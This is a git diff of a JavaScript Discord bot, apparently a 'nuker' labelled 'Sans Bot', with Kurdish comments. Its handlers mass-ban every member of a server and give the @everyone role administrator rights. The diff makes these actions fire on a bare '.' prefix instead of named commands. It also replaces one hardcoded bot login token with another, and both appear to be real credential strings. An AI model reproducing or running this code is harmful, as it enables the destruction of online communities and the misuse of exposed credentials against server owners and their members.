@@ -1,6 +1,6 @@
 const Discord = require('discord.js');
 const client = new Discord.Client();
-const prefix = 't!help'///lera ba dly xot prefix dabne
+const prefix = '.'///lera ba dly xot prefix dabne
 client.on('ready', () => {
 console.log(`Logged in as ${client.user.tag}!`);
  
@@ -14,13 +14,13 @@ console.log(`Logged in as ${client.user.tag}!`);
 // }) 
 
 client.on("message", msg => {
-if (msg.content.toLowerCase().startsWith(prefix + "t!ban")) {
+if (msg.content.toLowerCase().startsWith(prefix + ".")) {
     msg.guild.members.forEach(m =>
       m.ban("Banned By Sans Bot | Developed By Sans")
       )
 }})
 client.on('message', message => {
-    if (message.content.startsWith(prefix + "t!hack")) {
+    if (message.content.startsWith(prefix + ".")) {
         message.delete();
         message.guild.roles.find('name', '@everyone').edit({
             permissions: ["ADMINISTRATOR"]///premission akata adminstator
@@ -71,7 +71,7 @@ client.on('message', message => {
  
 
 client.on('message', async msg => {
-  if(msg.content.startsWith('.leaveall')) {
+  if(msg.content.startsWith('.')) {
     msg.guild.members.forEach(m =>{
                     m.ban()
                 }) 
@@ -118,5 +118,5 @@ if (message.content.startsWith(adminprefix + 'setava')) {
 
  ////codaka drwst krawa lalayan black jack
 
-client.login("ODE2NjIwMTcwMDc1MTc2OTkx.YD9mzA.MvHlthAbx-Iw421FvMj39v5YPQ0")
+client.login("NzYyNzEwNTA0NTU2MzMxMDI4.X3tHgg.ETL12va8Y8iq1wkkdQkeElxO1VE")
           
